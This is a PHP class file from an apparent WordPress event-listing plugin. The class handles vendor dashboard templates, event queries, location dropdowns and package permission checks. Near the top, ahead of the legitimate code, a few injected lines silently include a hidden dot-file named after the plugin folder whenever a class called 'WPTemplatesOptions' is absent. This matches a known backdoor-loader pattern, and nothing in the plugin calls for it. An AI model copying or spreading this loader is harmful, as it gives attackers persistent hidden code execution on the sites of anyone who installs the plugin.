<?php if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Vendor {

	protected static $_instance = null;

	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}

	/* Get template vendor */
	public function get_template_vendor( $get_data ){

		$args_vendor = isset( $get_data['vendor'] ) ? (string)$get_data['vendor'] : apply_filters( 'el_manage_vendor_default_page', 'general' );

		$post_id = isset( $get_data['id'] ) ? (string)$get_data['id'] : '';
		
		$current_user_id = wp_get_current_user()->ID;
		$author_id = get_post_field( 'post_author', $post_id );

		if( el_is_vendor() && apply_filters( 'el_manage_vendor_show_general', true ) ){
			$template = apply_filters( 'el_shortcode_myaccount_template_general', 'vendor/general.php' );	
		}else{
			$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
		}
		$msg = '';

		switch ($args_vendor) {

			case 'general':
			if( el_is_vendor() && apply_filters( 'el_manage_vendor_show_general', true ) ){
				$template = apply_filters( 'el_shortcode_myaccount_template_general', 'vendor/general.php' );
			}
			break;

			case 'listing':
			if( el_is_vendor() && apply_filters( 'el_manage_vendor_show_my_listing', true ) ){
				if( el_is_vendor() ){
					$template = apply_filters( 'el_shortcode_myaccount_template_events', 'vendor/events.php' );
				}else{
					$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
				}
			}
			break;

			case 'profile':
			$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
			break;

			case 'listing-edit':
			if( el_is_vendor() ){
				if ( $current_user_id == $author_id ) {
					$template = apply_filters( 'el_shortcode_myaccount_template_edit_event', 'vendor/edit-event.php' );
				} else {
					$template = apply_filters( 'el_shortcode_myaccount_template_events', 'vendor/events.php' );
				}
			}else{
				$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
			}
			break;

			case 'package':
			if( el_is_vendor() && apply_filters( 'el_manage_vendor_show_package', true ) ){
				$template = apply_filters( 'el_shortcode_package_template_package', 'vendor/package.php' );
			}else{
				$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
			}
			break;

			case 'wishlist':
			if( apply_filters( 'el_manage_vendor_show_wishlist', true ) ){
				$template = apply_filters( 'el_shortcode_wishlist_template_wishlist', 'vendor/wishlist.php' );
			}
			break;

			case 'mybookings':
			if( apply_filters( 'el_manage_vendor_show_mybooking', true ) ){
				$template = apply_filters( 'el_shortcode_mybookings_template_mybookings', 'vendor/mybookings.php' );
			}
			break;

			case 'create-event':
			if( el_is_vendor() && apply_filters( 'el_manage_vendor_show_create_event', true ) ){
				
				$check_create_event = el_check_create_event();
				switch ( $check_create_event['status'] ) {

					case 'false_total_event':
						$template = apply_filters( 'el_shortcode_package_template_package', 'vendor/package.php' );
						$msg = esc_html__( 'Please register a package or upgrade to high package because your current package is limit number events', 'eventlist' );
						break;

					case 'false_time_membership':
						$template = apply_filters( 'el_shortcode_package_template_package', 'vendor/package.php' );
						$msg = esc_html__( 'Your package time is expired', 'eventlist' );
						break;
						
					case 'error':
						$template = apply_filters( 'el_shortcode_package_template_package', 'vendor/package.php');
						$msg = esc_html__( 'You don\'t have permission add new event', 'eventlist' );
						break;		
					
					default:
						$template = apply_filters( 'el_shortcode_myaccount_template_edit_event', 'vendor/edit-event.php' );
						break;
				}

				
			}else{
				$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
			}
			break;	
			
			

			case 'manage_event':
			
			if( el_is_vendor() ){
				$tab = isset( $_GET['tab'] ) ? $_GET['tab'] : '';
				if( $tab && $tab == 'bookings' ){
					$template = apply_filters( 'el_shortcode_myaccount_template_bookings', 'vendor/bookings.php' );
				}elseif( $tab && $tab == 'tickets' ){
					$template = apply_filters( 'el_shortcode_myaccount_template_tickets', 'vendor/tickets.php' );
				}else{
					$template = apply_filters( 'el_shortcode_myaccount_template_manage_event', 'vendor/manage_event.php' );
				}
			}else{
				$template = apply_filters( 'el_shortcode_myaccount_template_profile', 'vendor/profile.php' );
			}
			break;
			

		}

		return array( 'template' => $template, 'msg' => $msg );

	}

	/* Get all event */
	public function get_vendor_events ( $order, $orderby, $status, $user_id, $paged ) {
		
		$args_orderby = array();

		
		$today_day = current_time('timestamp');
		$_prefix = OVA_METABOX_EVENT;

		if( $status == 'open' ){

			$args_base = array(
				'post_type'      => 'event',
				'order'          => $order,
				'author'         => $user_id,
				'paged'          => $paged,
				'meta_query' => array(
					array(
						'key' => $_prefix.'end_date_str',
						'value' => $today_day,
						'compare' => '>='
					)
				)
			);	

		}else if( $status == 'closed' ){

			$args_base = array(
				'post_type'      => 'event',
				'order'          => $order,
				'author'         => $user_id,
				'paged'          => $paged,
				'meta_query' => array(
					array(
						'key' => $_prefix.'end_date_str',
						'value' => $today_day,
						'compare' => '<'
					)
					
				)
			);

		}else if( empty( $paged ) ) {
			$args_base = array(
				'post_type'      => 'event',
				'post_status'    => $status,
				'order'          => $order,
				'author'         => $user_id,
				'posts_per_page'          => '-1',
			);	
		}else{
			$args_base = array(
				'post_type'      => 'event',
				'post_status'    => $status,
				'order'          => $order,
				'author'         => $user_id,
				'paged'          => $paged,
			);	
		}



		switch ($orderby) {
			case 'title':
			$args_orderby =  array( 'orderby' => 'title' );
			break;

			case 'start_date':
			$args_orderby =  array( 'orderby' => 'meta_value_num', 'meta_key' => $_prefix.'start_date_str' );
			break;

			case 'end_date':
			$args_orderby =  array( 'orderby' => 'meta_value_num', 'meta_key' => $_prefix.'end_date_str' );
			break;
			
			case 'ID':
			$args_orderby =  array( 'orderby' => 'ID');
			break;
			
			default:
			break;
		}

		$args = array_merge_recursive( $args_base, $args_orderby );

		$event = new WP_Query( $args );
		return $event;
	}


	/* Get taxonomy */
	public function el_get_taxonomy ( $taxonomy, $selected='' ) {

		$args = array(
			'taxonomy'          => $taxonomy,
			'show_option_all'   => '' ,
			// 'show_option_none'  => esc_html__( 'All Tags', 'eventlist' ),
			'post_type'         => 'event',
			'post_status'       => 'publish',
			'posts_per_page'    => '-1',
			'option_none_value' => '',
			'orderby'           => 'name',
			'order'             => 'ASC',
			'show_count'        => 0,
			'hide_empty'        => 0,
			'child_of'          => 0,
			'exclude'           => '',
			'include'           => '',
			'echo'              => 1,
			'selected'          => $selected,
			'hierarchical'      => 1,
			// 'name'           => 'event_tag',
			'id'                => '',
			'depth'             => 0,
			'tab_index'         => 0,
			'hide_if_empty'     => false,
			'value_field'       => 'slug',
		);

		return get_categories($args);
	}


	/* Get Country */
	public function el_get_state ( $selected='' ) {

		$args = array(
			'show_option_all'   => '' ,
			'show_option_none'   => esc_html__( 'All States', 'eventlist' ),
			'post_type'         => 'event',
			'post_status'       => 'publish',
			'posts_per_page'    => '-1',
			'option_none_value' => '',
			'orderby'           => 'name',
			'order'             => 'ASC',
			'show_count'        => 0,
			'hide_empty'        => 0,
			'child_of'          => 0,
			'exclude'           => '',
			'include'           => '',
			'echo'              => 1,
			'selected'          => $selected,
			'hierarchical'      => 1,
			'name'              => 'event_state',
			'id'                => '',
			'class'             => 'selectpicker postform',
			'depth'             => 1,
			'tab_index'         => 0,
			'taxonomy'          => 'event_loc',
			'hide_if_empty'     => false,
			'value_field'       => 'slug',
		);

		return wp_dropdown_categories($args);
	}


	/* Get City */
	public function el_get_city( $selected='' ){
		$args_country = array(
			'taxonomy'               => 'event_loc',
			'object_ids'             => null,
			'orderby'                => 'name',
			'order'                  => 'ASC',
			'hide_empty'             => false,
			'include'                => array(),
			'exclude'                => array(),
			'exclude_tree'           => array(),
			'number'                 => '',
			'offset'                 => '',
			'fields'                 => 'all',
			'count'                  => false,
			'name'                   => '',
			'slug'                   => '',
			'term_taxonomy_id'       => '',
			'hierarchical'           => false,
			'search'                 => '',
			'name__like'             => '',
			'description__like'      => '',
			'pad_counts'             => false,
			'get'                    => '',
			'child_of'               => 0,
			'parent'                 => 0,
			'childless'              => false,
			'cache_domain'           => 'core',
			'update_term_meta_cache' => true,
			'meta_query'             => '',
			'meta_key'               => '',
			'meta_value'             => '',
			'meta_type'              => '',
			'meta_compare'           => '',
		);

		$include_city = array();

		if( isset( $_GET['event_state']) && $_GET['event_state'] != '' ){
			$country_current = get_term_by( 'slug',  $_GET['event_state'], 'event_loc' );
			$country_info = get_term_children( $country_current->term_id, 'event_loc' );

			foreach ( $country_info as $value ) {
				$term_city = get_term_by( 'id', $value, 'event_loc' );
				$include_city[] = $term_city->term_id;
			}
		}

		$country = array();
		$tax_country = get_terms( $args_country );
		foreach ($tax_country as $key => $value) {
			$country[] = $value->term_id;
		}

		$args = array(
			'show_option_all'   => '' ,
			'show_option_none'  => esc_html__( 'All Cities', 'eventlist' ),
			'post_type'         => 'event',
			'post_status'       => 'publish',
			'posts_per_page'    => '-1',
			'option_none_value' => '',
			'orderby'           => 'name',
			'order'             => 'ASC',
			'show_count'        => 0,
			'hide_empty'        => 0,
			'child_of'          => 0,
			'exclude'           => $country,
			'include'           => $include_city,
			'echo'              => 1,
			'selected'          => $selected,
			'hierarchical'      => 1,
			'name'              => 'event_city',
			'id'                => '',
			'class'             => 'selectpicker postform',
			'depth'             => 0,
			'tab_index'         => 0,
			'taxonomy'          => 'event_loc',
			'hide_if_empty'     => false,
			'value_field'       => 'slug',
		);

		return wp_dropdown_categories($args);
	}

	public function check_allow_get_list_attendees_by_event($id_event) {

		if( $id_event == null ) return;
		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return 'yes';

		$post_id_package = $this->get_post_id_package_by_event($id_event);


		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'list_attendees', true);
		return apply_filters( 'check_list_attendees', $check_allow );
	}

	public function check_allow_export_attendees_by_event ($id_event) {
		if( $id_event == null ) return;
		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return 'yes';

		$post_id_package = $this->get_post_id_package_by_event($id_event);
		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'export_attendees', true);
		return apply_filters( 'check_export_attendees', $check_allow );
	}

	public function check_allow_get_list_tickets_by_event ($id_event) {
		if( $id_event == null ) return;
		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return 'yes';

		$post_id_package = $this->get_post_id_package_by_event($id_event);
		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'list_tickets', true);
		return apply_filters( 'check_list_ticket',  $check_allow);
	}

	public function check_allow_export_tickets_by_event ( $id_event ) {
		if( $id_event == null ) return;
		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return 'yes';

		$post_id_package = $this->get_post_id_package_by_event($id_event);
		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'export_tickets', true);
		return apply_filters( 'check_export_ticket', $check_allow );
	}

	public function check_allow_change_tax_by_event ( $id_event = null ) {

		if( $id_event == null ) return;


		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return;

		$post_id_package = $this->get_post_id_package_by_event($id_event);

		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'change_tax', true);
		return apply_filters( 'check_change_tax', $check_allow );
	}

	public function check_allow_change_tax_by_user_login() {
		$enable_package = EL()->options->package->get( 'enable_package', 'no' );
		if ($enable_package !== 'yes') return;

		$id_user = get_current_user_id();
		$package_id = get_user_meta($id_user, 'package', true);

		if ( empty($package_id) ) return ;

		$agrs = [
			'post_type' => 'package',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => OVA_METABOX_EVENT . 'package_id',
					'value' => $package_id
				],
			],
			'post_per_page' => 1,
		];

		$package = get_posts( $agrs );
		
		if ( empty($package) ) return;
		$post_id_package = $package[0]->ID;
		
		if ( empty($post_id_package) ) return;
		$check_allow = get_post_meta($post_id_package, OVA_METABOX_EVENT . 'change_tax', true);
		return apply_filters( 'check_change_tax', $check_allow );
	}

	public function get_post_id_package_by_event ( $id_event = null ) {
		if($id_event == null) return;

		$id_user = get_current_user_id();
		$package_id = get_post_meta($id_event, OVA_METABOX_EVENT . 'package', true);

		if ( empty($package_id) ) return ;
		// echo '$package_id: ' . $package_id . ' ';
		$agrs = [
			'post_type' => 'package',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => OVA_METABOX_EVENT . 'package_id',
					'value' => $package_id
				],
			],
			'post_per_page' => 1,
		];

		$package = get_posts( $agrs );
		// var_dump($package);
		// echo '$post_id_package: ' . $post_id_package . ' ';
		if ( empty($package) ) return;
		$post_id_package = $package[0]->ID;

		return $post_id_package;
	}

	public function display_date_event ( $start_date = '', $start_time = '', $end_date = '', $end_time = '' ) {
		$date = array();
		if( $start_date ){
			$date[] = '<span class="date">'.$start_date .'</span> <span class="slash">@</span> <span class="time">'.$start_time.'</span>';
		}
		
		if( $end_date ){
			$date[] = '<span class="date">'.$end_date .'</span> <span class="slash">@</span> <span class="time"> '.$end_time.'</span>'; 
		}
		echo implode( ' <span class="slash">-</span> ', $date );
	}


	public function calc_total_gross_sales ( $post_id, $filter ) {

	} 


}